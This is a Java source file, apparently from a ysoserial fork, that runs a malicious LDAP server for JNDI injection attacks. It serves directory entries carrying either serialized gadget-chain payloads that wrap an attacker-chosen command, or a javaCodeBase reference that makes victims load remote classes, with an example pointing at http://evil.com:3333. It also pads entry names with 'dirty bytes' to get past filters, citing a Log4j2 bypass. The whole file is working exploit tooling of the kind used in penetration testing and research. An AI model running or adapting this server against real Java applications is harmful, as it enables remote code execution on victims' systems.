package ysoserial.exploit;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.Entry;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;

/**
 *
 * 开启一个恶意的LDAP Server
 * 可以打JNDI LDAP Injection
 * 支持 URLClassLoader方式(jdk < 8u121) 和 反序列化方式(全版本)
 * 传参
 * URLClassLoader格式
 * mode ServerName ListeningPort javaCodeBase javaClassName
 * 反序列化格式
 * mode ServerName ListeningPort PayloadObject command
 * */
public class LDAPListener {
    private static String mode;
    private static String payloadObjectName;
    private static String command;
    private static int listeningPort;
    private static String dc = "dc=com";
    private static String entrySting = "";
    private static String codeBase = "http://127.0.0.1";
    private static String factory = "A";
    //add dirtyByte. Like the Log4j2 1.5.0.rc1 Bypass
    private static byte[] dirty;

    private static InMemoryListenerConfig inMemoryListenerConfig;
    private static InMemoryDirectoryServerConfig inMemoryDirectoryServerConfig;
    private static InMemoryDirectoryServer inMemoryDirectoryServer;

    /**
     * Usage:
     * for serialization: java -jar xx.jar mode port payload command [dc] [entry] [dirtyByte]
     * for urlClassLaoder: java -jar xx.jar mode port codeBase factory [dc] [entry] [dirtyByte]
     * for tomcatEl: java -jar xx.jar mode port codebase className [dc] [entry] [dirtyByte]
     * Example:
     * java -jar xx.jar serializationAttack 2233 CommonsCollection1 calc
     * java -jar xx.jar urlClassLoaderAttack 2233 http://evil.com:3333 Attack
     * java -jar xx.jar serializationAttack 2233 CommonsCollection1 calc dc=com a=b "10 20"
     * */
    public static void main(String[] args) throws Exception{
        //Parse the args
        try{
            mode = args[0];
            listeningPort = Integer.parseInt(args[1]);
            initial();
            if (args.length > 4){
                dc = args[4];
                entrySting = args[5];
                setDirtyByte(args[6]);
            }

            if ("serializationAttack".equals(mode)){
                payloadObjectName = args[2];
                command = args[3];
                serializationAttack();
            }else if ("urlClassLoaderAttack".equals(mode)){
                codeBase = args[2];
                factory = args[3];
                urlClassLoaderAttack();
            }
            banner();
        }catch (Exception e){
            System.out.println("Usage For JNDI Serialization: java -jar xx.jar mode serverName port payload command [dirtyByte] [dc] [evilEntry]");
            System.out.println("Usage For JNDI URLClassLoader: java -jar xx.jar mode port codeBase factory [dirtyByte] [dc] [evilEntry]");
            System.out.println("Usage For JNDI Tomcat EL: java -jar xx.jar mode port codebase className [dirtyByte] [dc] [evilEntry]");
            e.printStackTrace();
        }
    }

    public static void serializationAttack() throws Exception{
        String evilEntry = entryStringGenerator(entrySting, "," + dc, dirty);
        entrySting = evilEntry;

        byte[] payloadBytes = getPayloadBytes();
        Entry entryEvil = new Entry(evilEntry);

        entryEvil.addAttribute("javaCodeBase", codeBase);
        entryEvil.addAttribute("javaFactory", factory);
        entryEvil.addAttribute("javaClassName", "c");
        entryEvil.addAttribute("javaSerializedData", payloadBytes);
        entryEvil.addAttribute("objectClass", "javaNamingReference"); //必须要有，否则无法成立一个entry

        inMemoryDirectoryServer.addEntries(entryEvil);
        inMemoryDirectoryServer.startListening();
    }

    /*
    * */
    public static void urlClassLoaderAttack() throws Exception{
        String evilEntry;
        if (!"".equals(entrySting)){
            evilEntry = entryStringGenerator(entrySting, "," + dc, dirty);
            entrySting = evilEntry;
            generatorEntry(evilEntry);
        }
        inMemoryDirectoryServer.startListening();
    }

    private static String entryStringGenerator(String uriLeft, String uriRight, byte[] badChars){
        byte[] uriNewBytes;
        byte[] uriLeftBytes = uriLeft.getBytes();
        byte[] uriRightBytes = uriRight.getBytes();

        if (badChars == null){
            uriNewBytes = new byte[uriLeftBytes.length + uriRightBytes.length];
            System.arraycopy(uriRightBytes, 0, uriNewBytes, uriLeftBytes.length, uriRightBytes.length);
        }else {
            uriNewBytes = new byte[uriLeftBytes.length + uriRightBytes.length + badChars.length];
            System.arraycopy(badChars, 0, uriNewBytes, uriLeftBytes.length, badChars.length);
            System.arraycopy(uriRightBytes, 0, uriNewBytes, uriLeftBytes.length + badChars.length, uriRightBytes.length);
        }
        System.arraycopy(uriLeftBytes, 0, uriNewBytes, 0, uriLeftBytes.length);

        String uri = new String(uriNewBytes);
        return uri;
    }

    private static byte[] getPayloadBytes() throws Exception{
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        Class paylaodClass = Class.forName("ysoserial.payloads." + payloadObjectName);
        Object payload = paylaodClass.newInstance();
        Method getObjectMethod = paylaodClass.getDeclaredMethod("getObject", String.class);
        getObjectMethod.setAccessible(true);
        Object payloadObject = getObjectMethod.invoke(payload, command);
        objectOutputStream.writeObject(payloadObject);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }

    private static void generatorEntry(String  entryString) throws Exception{
        Entry entry = new Entry(entryString);
        entry.addAttribute("javaCodeBase", codeBase);
        entry.addAttribute("javaFactory", factory);
        entry.addAttribute("javaClassName", "c");
        entry.addAttribute("objectClass", "javaNamingReference");
        inMemoryDirectoryServer.addEntries(entry);
    }

    public static void setDirtyByte(String dirtyString) {
        //Input Format: "10 20"
        //split byte [space]
        String[] s = dirtyString.split(" ");
        byte[] dirtyBytes = new byte[s.length];
        for (int i=0; i<s.length; i++){
            dirtyBytes[i] = (byte) Integer.parseInt(s[i]);
        }
        dirty = dirtyBytes;
    }

    private static void initial() throws Exception{
        InetAddress localHost = Inet4Address.getByAddress(new byte[]{
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
        });

        inMemoryListenerConfig = new InMemoryListenerConfig(
            "server",
            localHost,
            listeningPort,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(),
            (SSLSocketFactory) SSLSocketFactory.getDefault()
        );

        inMemoryDirectoryServerConfig  = new InMemoryDirectoryServerConfig(dc);
        inMemoryDirectoryServerConfig.setListenerConfigs(inMemoryListenerConfig);
        inMemoryDirectoryServerConfig.setSchema(null);
        inMemoryDirectoryServer = new InMemoryDirectoryServer(inMemoryDirectoryServerConfig);

        generatorEntry(dc);
    }

    private static void banner() throws Exception{
        System.out.println("[+] Current Attack Mode is " + mode);
        System.out.println("[+] LDAP Server Listening....");
        System.out.println("[+] Configuration Here");
        System.out.println("[+] mode: " + mode);
        System.out.println("[+] listeningPort: " + listeningPort);
        System.out.println("[+] payloadObjectName: " + payloadObjectName);
        System.out.println("[+] command: " + command);
        System.out.println("[+] dc: " + dc);
        System.out.println("[+] codeBase: " + codeBase);
        System.out.println("[+] factory: " + factory);
        System.out.println("[+] LDAP url: " + entrySting + "," + dc);

        byte[] entryStingBytes = entrySting.getBytes();
        StringBuffer ldapUrl = new StringBuffer();

        for (byte entryStingByte : entryStingBytes) {
            ldapUrl.append("\\x");
            ldapUrl.append(entryStingByte);
        }
        System.out.println("[+] LDAP url(bytes): " + ldapUrl.toString());
    }
}
